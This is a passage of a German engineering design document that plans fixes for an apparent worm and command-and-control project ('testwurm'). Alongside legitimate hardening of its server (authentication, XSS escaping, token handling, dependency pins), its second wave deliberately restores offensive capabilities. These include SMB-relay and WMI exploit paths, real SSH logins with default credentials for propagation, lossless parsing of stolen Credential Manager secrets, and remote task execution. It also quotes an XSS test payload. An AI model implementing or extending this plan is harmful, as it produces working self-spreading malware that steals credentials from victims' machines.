  │              + derive_master_key_with_context reparieren             │
  │              + pub mod hostkey; aktivieren                            │
  │                                                                      │
  └──────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
                    WELLE 2 (Funktionslücken schließen)
  ┌──────────────────────────────────────────────────────────────────────┐
  │   ISSUE-2  ──► Exploit-Ports: 445, 5985, 5986 in die Portliste      │
  │   ISSUE-3  ──► try_default_credentials: echte Authentifizierung     │
  │   ISSUE-4  ──► JSON-Parse: Einzelobjekt vs. Array                   │
  │   ISSUE-6  ──► insert_task: Aufrufer im Server-Task-Fluss           │
  │   ISSUE-7  ──► wmi_exec: Aufrufer im Agenten                        │
  │   ISSUE-11 ──► Args: Token nicht ableitbar                          │
  │   ISSUE-5  ──► demo_worm: Nutzungskommentar korrigieren             │
  └──────────────────────────────────────────────────────────────────────┘
```

### Welle 1 — ISSUE-1: der CryptoProvider-Konflikt

Die Ursache ist eine Feature-Union über den ganzen Workspace. `axum-server` 0.7.3
aktiviert mit seinem Feature `tls-rustls` zusätzlich `rustls/aws-lc-rs`:

```toml
# axum-server 0.7.3, Cargo.toml
tls-rustls = [
    "tls-rustls-no-provider",
    "rustls/aws-lc-rs",        # ← aktiviert den zweiten Provider
]
```

`kx-tls` aktiviert seinerseits `rustls/ring`. Weil Cargo Features workspace-weit
unifiziert, landen beide Provider im selben `rustls`-Build. Rustls 0.23 kann dann
nicht entscheiden und paniked. `cargo tree -e features -i rustls` zeigt beide
Pfade:

```
├── rustls feature "aws-lc-rs"
│   └── axum-server feature "tls-rustls"
├── rustls feature "ring"
    ├── kx-tls
    └── ureq
```

Rustls bietet zwei Wege aus diesem Zustand, und der Unterschied ist nicht
kosmetisch:

* **`install_default()`** setzt einen Provider prozessweit. Der Build enthält
  weiter beide Provider, der aktivierte ist aber eindeutig.
* **Feature-Bereinigung** entfernt einen Provider aus dem Build ganz.

Die Feature-Bereinigung ist vorzuziehen, und zwar über das axum-server-Feature
`tls-rustls-no-provider`, das `rustls/aws-lc-rs` *nicht* aktiviert. Damit bleibt
`ring` als einziger Provider. Der Wechsel wurde empirisch verifiziert: mit
`axum-server = { version = "0.7", features = ["tls-rustls-no-provider"] }` baut der
Workspace, `aws-lc-rs` verschwindet vollständig aus `Cargo.lock`, und der Server
startet und antwortet mit der API-Übersicht.

Ergänzend wird in `kx-tls` ein Provider explizit installiert. Das ist
Absicht: `kx-tls` ist der einzige Ort, an dem TLS-Konfiguration entsteht, und er
wird von Server, Agent und CLI geteilt. Wer `kx-tls` benutzt, bekommt damit
automatisch einen konsistenten Provider. Die Rustls-Empfehlung ist hier
`install_default` **und** die Feature-Bereinigung — die erste macht den Provider
eindeutig, die zweite verhindert, dass der Provider überhaupt mehrdeutig wird.

Die Alternative `CryptoProvider::install_default()` allein, ohne Feature-Konflikt
zu beseitigen, würde funktionieren, aber `aws-lc-rs` im Build lassen: ein
C-Backend, das gebaut und gelinkt wird, ohne verwendet zu werden, mit eigener
Toolchain-Anforderung (CMake, NASM). Das ist eine zusätzliche Installationshürde
für einen Build, der sie nicht braucht.

### Welle 1 — ISSUE-12: Authentifizierung erzwingen

Der `Authenticated`-Extractor existiert, wird aber von keinem Handler verwendet.
Die `verify()`-Funktion vergleicht korrekt; sie läuft nur nie.

Der Fix folgt D1: eine `from_fn`-Middleware, per `route_layer` auf einem
**API-Subrouter**, der die fünf Vertragspfade trägt; der Dashboard-Router bleibt
getrennt und wird gemerged. Die vollständige Begründung mit dem gemessenen
Axum-Verhalten steht in D1, die verworfenen Wege in Alternative A und B.

Die Reihenfolge ist im Code zwingend: erst alle Routen, dann `route_layer`. Eine
danach hinzugefügte Route bliebe ungeschützt — im Prototyp nachgewiesen. Ein
Kommentar an der Stelle ist Teil der Umsetzung, nicht Kür.

Der Token-Vergleich muss constant-time erfolgen. Der aktuelle `verify()`
vergleicht mit `t == expected`, einem normalen String-Vergleich, der früher
zurückkehrt als nötig. Die übliche Härtung ist ein Vergleich über eine konstante
Länge; wie konkret das ausfällt, ist Teil von „Detailed Implementation".

Der Vergleich liest das erwartete Token aus `KX_SERVER_TOKEN`. Das ist prozessweit
und damit auch für jeden Kindprozess sichtbar. Der Token landet außerdem über
`--token` in der Prozessliste. Beides ist für ein lokales Werkzeug akzeptabel und
wird hier nicht geändert — es gehört aber in den Contract, damit die Eigenschaft
nicht unterstellt wird, die sie nicht hat.

### Welle 1 — ISSUE-13: Dashboard escapen und HTML-Login einführen

Zwei Änderungen an derselben Datei (`kx-server/src/dashboard.rs`), plus ein neuer
Endpunkt.

**Das Escaping zuerst.** `dashboard.rs:30-32` interpoliert die API-Werte per
Template-Literal in `<td>${x}</td>` und setzt das Ergebnis per `innerHTML`. Der
Server legt die gelieferten Strings unverändert ab. Damit wird ein im
`hostname` enthaltenes `<img src=x onerror=…>` zu ausführbarem Markup — im
Browser des Operators, in dem Kontext, in dem die Beute-Passwörter stehen.

Verifiziert end-to-end gegen den laufenden Server:

```
POST /api/register  {"host_id":"10.0.0.5", …, "hostname":"<img src=x onerror=alert(1)>"}
→ HTTP 201
GET /api/hosts     → HTTP 200, body enthält: <img src=x onerror=alert(1)>
```

Der Fix: die Werte vor dem Einsetzen escapen — entweder `textContent` statt
`innerHTML` (dann müssen die Zellen einzeln erzeugt werden) oder ein
`escapeHtml()`-Helper, der vor dem Zeilenaufbau über jeden Wert läuft. Der
Helper ist die kleinere Änderung und hält die bestehende Tabellenstruktur.

**Dann das HTML-Login.** Das Dashboard bekommt ein Formular, mit dem der Operator
das Token eingibt. Der Ablauf:

1. `GET /` liefert das Dashboard-HTML mit dem Login-Formular. Das Formular ist
   sichtbar, solange kein Token vorliegt.
2. Das Formular schickt das Token per `fetch` an `POST /api/login`.
3. Der Server prüft es gegen `KX_SERVER_TOKEN`. Bei Erfolg `200`, bei
   Misserfolg `401`.
4. Das JavaScript hält das Token in einer Variable, blendet das Formular aus
   und lädt die drei Tabellen. Jeder `fetch` trägt den `Authorization`-Header.

Kein Cookie: Ein Cookie würde vom Browser automatisch mitgesendet (CSRF), ein
`Authorization`-Header nicht. Für ein Dashboard, das Credential-Passwörter
anzeigt, ist das der gewichtigere Unterschied. Der Preis ist, dass das Token
nach einem Neuladen der Seite verloren ist — der Operator meldet sich erneut an.

**Der neue Endpunkt ist ein Response-Pfad.** `POST /api/login` ist eine
Antwort — der Server teilt mit, ob das Token stimmt. Nach ADR-0001 ist ein
Antworttyp strikt, also gehört `PATH_LOGIN` nach `kx_core::c2` und ins
Key-Set-Pinning. Der Pfad prüft das Token, das er entgegennimmt, und gehört
deshalb **nicht** in den geschützten API-Subrouter aus D1 — er würde sich
sonst selbst blockieren. Er wird daneben registriert, ungeschützt, mit
eigener Token-Prüfung.

**Die Reihenfolge ist nicht beliebig.** Escaping vor Login. Wer das Login zuerst
baut, verlagert das Token in den Arbeitsspeicher des Browsers, in dem ein
injiziertes `<script>` es auslesen kann — und macht die Lage damit schlechter
als vorher, wo das Token zwar in der URL stand, ein injiziertes Skript es aber
ebenfalls auslesen konnte.

### Welle 1 — ISSUE-8 und ISSUE-9: der ml-kem-Pin und das hostkey-Modul

Das sind zwei Issues, aber eine Ursache und eine Kette.

`kx-core/Cargo.toml` deklariert `ml-kem` eigenständig:

```toml
ml-kem = { version = "0.2.1", default-features = false, features = ["std", "zeroize"] }
```

`version = "0.2.1"` ohne `=`-Pin ist ein Caret-Bereich, der 0.2.3 zulässt. Der
Workspace-Pin in `kx/Cargo.toml` (`version = "=0.2.1"`) greift nicht, weil `kx-core`
die Dependency nicht über `.workspace = true` bezieht. `kx/Cargo.lock` löst
tatsächlich **0.2.3** auf. Die Vertragsdokumentation behauptet, `ml-kem` sei auf
0.2.1 gepinnt — das ist die Aussage, die der Drift-Report als falsch markiert hat.

**Der Pin-Fix allein bringt aber nichts** — und in der vom Epic vorgeschlagenen
Form bricht er sogar den Build. Nach D3 wird der Workspace-Pin auf **`=0.2.3`**
angehoben und `kx-core` auf `ml-kem = { workspace = true }` umgestellt. Warum
nicht `=0.2.1`: `ml-kem` 0.2.1 verlangt `kem` mit dem Caret-Bereich
`0.3.0-pre.0`, 0.2.3 dagegen exakt mit `=0.3.0-pre.0`. Der Caret-Bereich lässt
`kem` 0.3.0 zu, das zieht `rand_core` 0.10.1 neben die 0.6.4 des Workspaces, und
die Trait-Definitionen sind inkompatibel:

```
error[E0107]: trait takes 0 generic arguments but 2 generic arguments were supplied
error[E0053]: method `decapsulate` has an incompatible type for trait
error[E0437]: type `Error` is not a member of trait `::kem::Decapsulate
```

Verifiziert mit `ml-kem` 0.2.3: genau eine `rand_core`-Version im Lockfile,
`cargo build --workspace` grün.

Unabhängig davon importiert `hostkey.rs` eine API, die in **keiner** der
0.2.x-Versionen existiert:

```rust
use ml_kem::{bihash::Sha3_256, Array as MlArray, EncodedKey as MlEncodedKey,
             MlKem768, MlKem768Derive};
```

`bihash`, `EncodedKey`, `MlKem768Derive`, `SecretKey`, `generate_keypair` und
`decapsulated_key_from_encoded` sind in 0.2.1, 0.2.3 und auch 0.1.1 nicht
vorhanden — verifiziert gegen die jeweiligen Quellbäume. `ml-kem` 0.2.x ist eine
Trait-basierte API:

| hostkey.rs will | ml-kem 0.2.x bietet |
|---|---|
| `generate_keypair(rng)` | `<MlKem768 as KemCore>::generate(rng)` → `(DecapsulationKey, EncapsulationKey)` |
| `encapsulate(pk, rng)` | `Encapsulate::encapsulate(&ek, rng)` → `(Ciphertext, SharedKey)` |
| `decapsulate(ct)` | `Decapsulate::decapsulate(&dk, &ct)` → `SharedKey` |
| `EncodedKey::from_slice(&[u8])` | `EncodedSizeUser::from_bytes(&Encoded<Self>)` |
| `SecretKey<MlKem768Derive, Sha3_256>` | `DecapsulationKey<MlKem768Params>` |
| `ml_kem::Array` | `ml_kem::array::Array` |

Die Umschreibung ist machbar und ihre Größe ist absehbar. Ein Prototyp gegen
ml-kem 0.2.x kompiliert und läuft:

```
ek=1184 dk=2400
ct=1088 shared len = 32
```

Diese Werte sind exakt die, die das Format bereits annimmt: `MLKEM_PUB_LEN` 1184,
`MLKEM_CT_LEN` 1088. **Das Format ändert sich nicht** — der Kompilierfehler war rein
ein API-Drift, keine inkompatible Formatentscheidung. Das ist der Grund, warum
ISSUE-9 ohne Formatversion und ohne Migrationspfad lösbar ist.

Eine Kompatibilitätsfrage bleibt: `ml-kem` 0.2.x braucht `CryptoRngCore` aus
`rand_core` 0.6, das ein Supertrait von `CryptoRng` und `RngCore` ist. `kx-core`
hat bereits den Adapter `MlRng`, der `rand_core::RngCore` implementiert. Für 0.2.x
muss dieser Adapter zusätzlich `rand_core::CryptoRng` (Marker-Trait) und `RngCore`
implementieren — ein überschaubares Delta, kein Neuaufbau.

Der `deterministic`-Feature bleibt aus. Er verlangt vom Aufrufer, das
Kapselungsgeheimnis `m` selbst mitzubringen; ein Fehler dort ist ein totaler
Schlüsselverlust. Das ist die bestehende, begründete Entscheidung und sie gilt
unverändert.

### Welle 1 — ISSUE-10: die systemd-Unit

`install_systemd_service("kx-agent", &exe, "")` schreibt eine Unit mit
`ExecStart={path} ` — leerem Kommando. Da `--server` und `--token` zwingend sind,
startet der Agent nie erfolgreich; mit `Restart=always` und `RestartSec=5`
entsteht eine Neustart-Schleife, die den Rechner belastet und das eigentliche
Problem verdeckt.

Der Fix hat zwei Teile, und der zweite ist der wichtigere:

1. Die Unit bekommt ein vollständiges `ExecStart` mit Server-URL und Token.
2. **Der Token steht nicht im Klartext in der Unit-Datei.** Eine Unit-Datei unter
   `/etc/systemd/system/` ist für jeden lesbar, der die Datei lesen darf. Die
   systemd-Alternative ist `EnvironmentFile=` — eine separate Datei mit
   restriktiven Rechten, die per `Environment=` in die Unit eingebunden wird. Das
   Token steht damit nicht in der Unit, sondern in einer Datei mit `0600`.

Das ist mehr Aufwand als ein `ExecStart` mit eingebettetem Token, aber es ist die
einzige Variante, die die Unit-Datei nicht zum öffentlichen Token-Transport macht.
Die Entscheidung zwischen Klartext-Token, `EnvironmentFile` und
`systemd-credentials` ist eine von mehreren vertretbaren Antworten und steht in
„Alternatives Considered".

### Welle 2 — die Funktionslücken

**ISSUE-2 (SMB-Relay toter Code).** `COMMON_PORTS` enthält 22, 80, 135, 443, 1433,
1521, 3306, 5432, 5900, 8080 — aber nicht 445. Der Zweig in `propagate.rs` wird
also nie betreten. Die Ports der Exploit-Pfade gehören nicht in die allgemeine
Scan-Liste, sondern in eine eigene: ein Exploit-Scan über 445, 5985 und 5986 auf
allen Zielen ist eine andere Operation als eine Port-Übersicht. Der Fix führt
eine getrennte Exploit-Port-Konstante ein und scannt damit in einem zweiten
Durchgang. Nicht in `COMMON_PORTS` aufzunehmen ist die Entscheidung, weil die
allgemeine Liste ein billiger SYN-Scan ist und 445/5985/5986 gezielte
Exploit-Versuche auslösen sollen.

**ISSUE-3 (Default-Credentials toter Code).** `try_default_credentials` iteriert
über `DEFAULT_CREDENTIALS`, loggt und gibt dann `Ok(None)` zurück. Der Pfad muss
gegen die offenen Dienste tatsächlich authentifizieren. Nach D4 bleibt der Pfad
an SSH (Port 22) gebunden — so steht es in `kx/README.md:270`, so ist er in
`propagate.rs:104` verdrahtet, und Port 22 steht bereits in `COMMON_PORTS`. Für
die Umsetzung kommt `russh` 0.54 mit `features = ["ring"]` hinzu (Begründung in
D4). Der Test braucht einen lokalen Mock-SSH-Dienst — `russh` kann Server
ebenso wie Client.

**ISSUE-4 (Credential Manager, einzelnes Credential).** Das PowerShell-Skript
erzeugt mit `$results | ConvertTo-Json` bei genau einem Element ein JSON-**Objekt**,
bei mehreren ein JSON-**Array**. `parse_secrets_from_json` erwartet aber
immer `Vec<Secret>`. Bei einem einzelnen Credential scheitert das Parsen, und
`unwrap_or_default()` liefert eine leere Liste — das gespeicherte Credential geht
stillschweigend verloren. Der Fix ist eine Normalisierung: erst versuchen als Array
zu parsen, bei Fehlschlag als Einzelobjekt wrappen und in eine Ein-Element-Liste
umwandeln. Der Fehlerpfad `unwrap_or_default()` verschluckt zusätzlich jeden
Parse-Fehler — er wird zum Diagnose-Logging, damit ein Fehlschlag nicht wie „keine
Credentials" aussieht.

**ISSUE-6 (Task-Tabelle ungenutzt).** `Db::insert_task` hat keinen Aufrufer,
`GET /api/tasks` liefert immer `[]`. Der `Task`-Typ in `kx_core::c2` existiert und
der Contract ist gepinnt — die Route ist da, die Daten nie. Der Fix braucht den
Aufrufer: der Server muss Tasks anlegen können, und der Agent muss offene Tasks
abholen und ihr Ergebnis zurückschreiben. Der `result`-Feldname ist dabei der
Punkt, an dem der Bug seinen Ursprung hatte — er ist im Contract gepinnt und darf
nicht wieder zu `output` werden.

**ISSUE-7 (wmi_exec ohne Aufrufer).** `wmi_exec` ist implementiert und exportiert,
hat aber keinen Aufrufer. Der dokumentierte WMI-Angriffspfad existiert damit nicht.
Wie ISSUE-2 gehört der Aufrufer in den Exploit-Pfad, mit den WMI-Ports 5985/5986.

**ISSUE-11 (Token im Debug-Output).** `Args` leitet `Debug` ab und enthält das
Token als `String`. Das Token landet damit in **jeder** Debug-Ausgabe der
Struktur. Der Fix entfernt die Ableitung oder ersetzt das Token-Feld durch einen
Typ, dessen `Debug` das Feld ausblendet. Da `Args` an vielen Stellen per
`{args.server}` referenziert wird, ist der Eingriff klein.

**ISSUE-5 (Demo-Kommentar).** Der Nutzungskommentar nennt `--range
192.168.1.1 192.168.1.254`, das Flag existiert aber nicht — die echten Flags sind
`--start` und `--end`. Reiner Kommentar-Fix.

### Verifikation der Wellen

Nach jeder Welle gilt die Abnahme:

```bash
cd /Volumes/T7/Projekte/testwurm/kx
cargo test --workspace              # 47 Tests grün, 0 Fehler; danach mehr
cargo build --release
./target/release/kx-server --host 127.0.0.1 --port 8443 --db /tmp/kx.db --token test
```

Der Start-Smoke-Test ist der eigentliche Abnahmeprüfpunkt: er schlägt heute mit dem
CryptoProvider-Panic fehl und muss nach ISSUE-1 mit der API-Übersicht antworten.
Danach kommen die Auth-Prüfungen aus CUJ-1: ohne Token `401`, mit falschem Token
`401`, mit korrektem Token `200`.

Welle 1 hat zusätzlich eine Akzeptanzbedingung, die über „der Server startet"
hinausgeht: der **End-to-End-Durchlauf** muss funktionieren. Agent startet, Host
registriert sich, Secret wird hochgeladen, Operator sieht es im Dashboard. Das ist
die Abnahme, die derzeit an jedem der drei Punkte scheitert.

## Alternatives Considered

Die Entscheidungen D1 bis D7 sind oben getroffen und begründet. Hier stehen die
verworfenen Wege mit dem Grund der Verwerfung.

### Alternative A für ISSUE-12: Authentifizierung per Extractor statt Middleware

* **Mechanismus**: Jeder Handler nimmt `Authenticated` als Parameter entgegen
  (`async fn list_hosts(State(st): State<AppState>, _auth: Authenticated) -> ...`).
  Der Extractor lehnt bei falschem Token mit `StatusCode::UNAUTHORIZED` ab.
* **Trade-offs**: Der Extractor ist explizit an der Handler-Signatur sichtbar —
  wer eine Route hinzufügt, sieht die Signatur und weiß, dass sie geschützt
  werden muss. Er ist keine zusätzliche Infrastruktur und kein Middleware-Setup.
  Kein globaler Zustand, keine Layer-Reihenfolge.
* **Wann er scheitert**: Sobald eine Route den Extractor vergisst, ist sie
  ungeschützt — und das fällt nicht auf, weil die Signatur ohne den Parameter
  kompiliert. Das ist exakt die Fehlerklasse, die ADR-0001 für den C2-Wire-Vertrag
  beseitigt hat: eine Umbenennung, die nicht laut bricht. Bei diesem Code ist die
  Wahrscheinlichkeit real, weil es sieben Routen sind und die Dashboard-Route
  keine JSON-API ist.
* **Verwerfungsgrund**: Der Compiler zwingt hier nichts. Ein Handler ohne den
  Extractor-Parameter ist gültiger Rust und wird ungeschützt ausgeliefert. Die
  Middleware in D1 schützt dagegen alle Routen des API-Routers automatisch —
  und der Auth-Bypass ist genau die Art Fehler, gegen die diese Absicherung
  gebaut wird.

### Alternative B für ISSUE-12: `.layer()` statt `.route_layer()`

* **Mechanismus**: `Router::layer` statt `Router::route_layer` für die
  Middleware.
* **Trade-offs**: Kein Unterschied im Schutz der registrierten Routen.
* **Wann er scheitert**: Bei unbekannten Pfaden. `layer` läuft auch bei
  Anfragen, die auf keine Route treffen, und macht aus einem 404 ein 401 — im
  Test bestätigt: `.layer()` auf dem Gesamtrouter lieferte für `/nope` ein
  **401** statt 404. Damit verrät der Server einem Unbekannten, ob ein Pfad
  existiert, und verhält sich bei Tippfehlern anders als bei echten
  Zugriffen.
* **Verwerfungsgrund**: `route_layer` ist die von Axum für Autorisierung
  vorgesehene Variante: es führt die Middleware nur aus, wenn die Anfrage
  tatsächlich auf eine Route trifft. Ein 404 bleibt 404.

### Alternative C für ISSUE-9: `ml-kem` auf 0.1.x zurückstufen

* **Mechanismus**: `ml-kem = "0.1"` in `kx-core/Cargo.toml`, `hostkey.rs` bleibt
  unverändert.
* **Trade-offs**: Null Code-Änderung in `hostkey.rs`.
* **Wann er scheitert**: Sofort. Die in `hostkey.rs` importierte API
  (`bihash::Sha3_256`, `EncodedKey`, `MlKem768Derive`, `SecretKey`,
  `generate_keypair`, `decapsulated_key_from_encoded`) existiert auch in 0.1.1
  nicht — verifiziert gegen den Quellbaum. `ml-kem` 0.1.x hat dieselbe
  Trait-basierte Struktur, nur mit geringfügig anderen Signaturen. Diese Alternative
  ist keine Abkürzung, sie ist eine Sackgasse.

### Alternative D für ISSUE-9: KEM-Bibliothek wechseln

* **Mechanismus**: Statt `ml-kem` eine andere ML-KEM-Implementierung wählen (zum
  Beispiel `pqc-kem`).
* **Trade-offs**: `pqc-kem` ist eine Randgruppe mit eigenem `ml-kem`-Abhängigkeit;
  sie löst das API-Problem nicht, sie verlagert es.
* **Wann er scheitert**: Es ist ein Dependency-Wechsel ohne inhaltlichen Gewinn.
  Der Aufwand ist größer als die API-Umschreibung, und das Risiko, dass eine
  andere Implementierung ein anderes Encoding liefert, ist real — das Format
  erwartet 1184 Byte für den öffentlichen Schlüssel.

### Alternative E für ISSUE-1: `install_default()` ohne Feature-Bereinigung

* **Mechanismus**: In `kx-tls` einen Provider per `CryptoProvider::install_default()`
  setzen und die Feature-Kollision bestehen lassen.
* **Trade-offs**: Ein Zeile Code, sofort wirksam, keine Cargo-Änderung.
* **Wann er scheitert**: `aws-lc-rs` bleibt im Build. Das ist ein C-Backend mit
  eigener Toolchain-Anforderung — auf Systemen ohne CMake oder NASM schlägt der
  Build fehl, obwohl der Code den Provider nie benutzt. Der Fehler tritt dann an
  einer Stelle auf, die mit TLS nichts zu tun hat. Die Feature-Bereinigung kostet
  eine Zeile in `Cargo.toml` und nimmt das Risiko ganz weg.

### Alternative F für ISSUE-10: Token im Klartext in der Unit

* **Mechanismus**: `ExecStart=/usr/bin/kx-agent --server https://... --token secret`.
* **Trade-offs**: Einfach, kein zusätzlicher Mechanismus, und die Unit-Datei
  beschreibt den Start vollständig.
* **Wann er scheitert**: Die Unit-Datei unter `/etc/systemd/system/` ist für jeden
  lesbar, der die Datei lesen darf. Auf einem Mehrbenutzer-System landet das
  C2-Token damit in einer welt lesbaren Datei. `EnvironmentFile=` mit `0600` löst
  das ohne zusätzliche Abhängigkeiten.

### Alternative G für ISSUE-3: `ssh2` statt `russh`

* **Mechanismus**: `ssh2` (Bindings an `libssh2`) für den SSH-Login.
* **Trade-offs**: Die verbreitetste Rust-SSH-Bibliothek, gut dokumentiert.
* **Wann er scheitert**: `ssh2` zieht `libssh2-sys` mit, das eine C-Bibliothek
  baut, und bringt `openssl-on-win32`/`vendored-openssl` als Feature-Varianten
  mit. Das ist genau die Toolchain-Hürde, die ISSUE-1 aus dem Build entfernt —
  sie käme über die Hintertür wieder herein. Dazu kann `ssh2` keinen Server
  spielen; der von ISSUE-3 geforderte Test gegen einen lokalen Mock-SSH-Dienst
  bräuchte also einen externen SSH-Daemon.
* **Verwerfungsgrund**: `russh` ist reines Rust, nutzt `rand_core` 0.6.4 wie der
  Workspace, kann Client und Server und lässt sich mit `features = ["ring"]`
  ohne `aws-lc-rs` bauen — verifiziert.

### Alternative H für ISSUE-3: Default-Credentials über RDP/SMB statt SSH

* **Mechanismus**: Der Exploit-Zweig testet Default-Credentials gegen die
  Windows-Dienste (445, 3389) statt gegen SSH.
* **Trade-offs**: `DEFAULT_CREDENTIALS` enthält mit
  `Administrator`/`Administrator` einen Windows-typischen Eintrag, was für
  Windows-Ziele spricht.
* **Wann er scheitert**: Der Aufruf-Zweig ist in `propagate.rs:104` an
  `service == "ssh"` gebunden, `kx/README.md:270` nennt den Pfad als
  „SSH-Systeme mit Default-Credentials testen", und die ISSUE-Datei nennt
  `ssh2`/`paramiko` — beides SSH. Die übrigen fünf Paare (`admin`/`admin`,
  `root`/`root`, `pi`/`raspberry`, `test`/`test`) sind Linux- und
  Netzwerkgeräte-typisch, nicht Windows-spezifisch.
* **Verwerfungsgrund**: Die Codebasis ist eindeutig; die Annahme im Epic, der
  Pfad müsse gegen Windows-Ziele laufen, wird vom Code nicht gestützt. Die
  Fehlversuche gegen Port 22 kosten Zeit, sonst nichts.

### Alternative I für ISSUE-8: CI-Prüfung auf die aufgelöste Version

* **Mechanismus**: Eine CI-Job, die `cargo tree -i ml-kem` prüft und die
  aufgelöste Version gegen eine Soll-Liste abgleicht.
* **Trade-offs**: Würde eine Regression zuverlässig melden, sobald es CI gibt.
* **Wann er scheitert**: Sofort — das Repository hat keine CI. Es existiert kein
  `.github/workflows/`, und `cargo test --workspace` ist der einzige
  Verifikationsweg. Eine Prüfung, die nie läuft, ist schlechter als keine,
  weil sie eine Kontrolle vortäuscht.
* **Verwerfungsgrund**: Die Umgehung wird strukturell verhindert (D3): `kx-core`
  deklariert `ml-kem` nicht mehr selbst, es gibt nur noch eine Stelle, an der
  eine Version stehen kann. Zusätzlich fängt ein Test, der `ml_kem::MlKem768`
  direkt benutzt, einen Versionswechsel, der die API bricht, mit einem
  Compiler-Fehler ab.

### Alternative J für ISSUE-9: eigener Endpunkt für den Master Key

* **Mechanismus**: Ein zusätzlicher Pfad `POST /api/keys`, über den der Agent
  den versiegelten Master Key registriert.
* **Trade-offs**: Sauberere Modellierung — die Schlüsselregistrierung ist ein
  eigener Lebenszyklus und gehört nicht in den Registrierungs- oder
  Secret-Upload.
* **Wann er scheitert**: Ein neuer Endpunkt erzeugt einen neuen
  **Antworttyp** — etwa die Antwort auf die Schlüsselregistrierung. Antworttypen
  sind per ADR-0001 strikt, mit Key-Set-Pinning. Das wäre ein tieferer Eingriff
  in den Wire-Vertrag als die beiden zusätzlichen Request-Felder, die für
  dasselbe Feature genügen.
* **Verwerfungsgrund**: Die betroffenen Typen in D5 sind Request-Typen, und
  Request-Typen sind genau die nach ADR-0001 lenienten — ein zusätzliches Feld
  bricht keinen älteren Server. Das ist die Eigenschaft, die wir hier brauchen;
  sie mit einem neuen Endpunkt aufzugeben wäre unnötiger Vertragseingriff.

### Alternative K für ISSUE-9: `sealed_master` im X25519-only-Modus auf 1120 auffüllen

* **Mechanismus**: Der Container ist immer 1120 Byte lang; im X25519-only-Modus
  wird der ML-KEM-Teil mit Nullen gefüllt.
* **Trade-offs**: Ein einheitliches Format, die Länge signalisiert den Modus
  implizit, `unseal_master_key` braucht keine Fallunterscheidung.
* **Wann er scheitert**: Es ändert die Bedeutung einer bestehenden Länge im
  Format. `SEALED_MASTER_LEN` ist 1120 und wird als Hybrid-Länge geführt; ein
  aufgefüllter Container sähe identisch aus, obwohl ML-KEM nie beteiligt war.
  Der `KexId` trägt die Information bereits — sie doppelt in der Länge zu
  kodieren, erzeugt einen zweiten Ort, an dem die Aussage über den KEX-Modus
  steht, und damit dieselbe Art Doppelpflege, die ISSUE-8 ausgelöst hat.
* **Verwerfungsgrund**: Modusabhängige Länge (D6) nutzt die vorhandene
  Information und ändert keine bestehende Zahl im Format.

## Non-Functional Requirements

**Sicherheit.** Der Auth-Bypass (ISSUE-12) und das unescapte Dashboard (ISSUE-13)
sind die beiden Stellen, an denen dieses Design eine bestehende
Sicherheitsgrenze verletzt statt eine zu schließen. Nach Welle 1 ist jede
Anfrage an die fünf Vertragspfade ohne korrektes Bearer-Token mit 401 zu
beantworten. Der Token-Vergleich erfolgt constant-time. Der Token steht nicht im
Klartext in der systemd-Unit, sondern in einer `EnvironmentFile` mit `0600`.
Das Dashboard-HTML (`GET /`) bleibt nach D2 offen — die Daten dahinter sind
geschlossen, weil das JavaScript sie erst nach dem HTML-Login per `fetch` mit
Header holt. Das Token verlässt den Query-String und steht damit weder in
Browser-Historie noch in Server-Logs noch in geteilten Links.

**Reihenfolge innerhalb von Welle 1:** Das Escaping der Dashboard-Werte (ISSUE-13)
ist **vor** dem HTML-Login (D2) umzusetzen. Beide sind klein, aber die
Reihenfolge ist nicht beliebig: solange ein injiziertes `<script>` im Dashboard
ausgeführt wird, kann es das Token aus dem Arbeitsspeicher auslesen. Wer das
Login zuerst baut und das Escaping später, macht die Lage in der Zwischenzeit
schlechter als heute.

**Kryptografie.** Der Hybrid-KEM (X25519 + ML-KEM-768) bleibt die vorgesehene
Kombination. Beide Anteile werden in der festen Reihenfolge X25519 → ML-KEM → HKDF
abgeleitet, weil die Reihenfolge Teil des Formats ist. Der `deterministic`-Feature
von `ml-kem` bleibt aus, weil ein Fehler in der Wahl des Kapselungsgeheimnisses ein
totaler Schlüsselverlust wäre. Die Schlüsselbytes des ML-KEM-Secrets werden beim
Drop genullt. Das `hostkey`-Modul enthält einen bekannten Fehler: `derive_master_key_with_context`
verwirft das HKDF-Ergebnis und liefert 32 Null-Bytes, weil das
`copy_nonoverlapping` mit Länge `0` läuft. Dieser Fehler muss in Welle 1 behoben
werden — er wird sonst aktiv, sobald das Modul kompiliert ist und die Beute
verschlüsselt werden soll. Er ist heute harmlos, weil der Pfad nie läuft.

**Korrektheit des Formats.** Das `KXENC`-Format ändert sich nicht. Die
Footer-Offsets, die CRC-Überdeckung (`CRC_COVER = 264`), die Nonce-Regel und die
AAD-Bindung bleiben unverändert. Die ml-kem-API-Umschreibung betrifft nur die
Schlüsselbehandlung; die für das Format relevanten Größen (1184 Byte öffentlicher
Schlüssel, 1088 Byte Chiffriertext, 32 Byte Shared Secret) sind verifiziert
identisch. Die `sealed_master`-Länge wird nach D6 modusabhängig geprüft
(1120 im Hybrid-Modus, 32 im X25519-only-Modus); `SEALED_MASTER_LEN` selbst
bleibt 1120, es ändert sich also keine Zahl im Format.

**Build-Reproduzierbarkeit.** Der Build darf keine C-Toolchain voraussetzen. Nach
D1 entfällt `aws-lc-rs` vollständig (Feature-Bereinigung bei `axum-server`), nach
D3 bleibt genau eine `rand_core`-Version (0.6.4) im Lockfile, und nach D4 kommt
`russh` ohne `aws-lc-rs` hinzu. Damit braucht der Workspace weder CMake noch NASM
noch einen C-Compiler.

**Rollout.** Welle 1 ist eine Serie von unabhängigen, einzeln testbaren Fixes.
Jeder ist einzeln revertierbar. Es gibt keine Feature-Flags und keine
kompatibilitätserhaltende Parallelstruktur: der `hostkey`-Pfad ist heute inaktiv,
also gibt es nichts, wofür eine Rückwärtskompatibilität zu erhalten wäre. Für
Rollback genügt der Branch. Nach Welle 1 ist der End-to-End-Durchlauf die
Abnahme, nicht der Unit-Test-Bestand.

**Beobachtbarkeit.** Die Verhaltensweisen, die diese Defekte ausgelöst haben,
hätten durch Tests abgedeckt werden können. Der Start-Panic ist ein
Laufzeitfehler, der CryptoProvider-Konflikt ist ein Feature-Unions-Problem — beide
sind zur Compile-Zeit nicht sichtbar, aber durch einen Test abdeckbar, der einen
`ServerConfig` baut. Der Auth-Bypass ist durch einen Test abdeckbar, der einen
Request ohne Token stellt. Jeder der geplanten Fixes bekommt deshalb einen Test,
der genau den Fehler fängt, der behoben wird — die Zuordnung steht in D7.

## Detailed Implementation

### Welle 1

**1. `kx/Cargo.toml` — axum-server-Feature bereinigen**

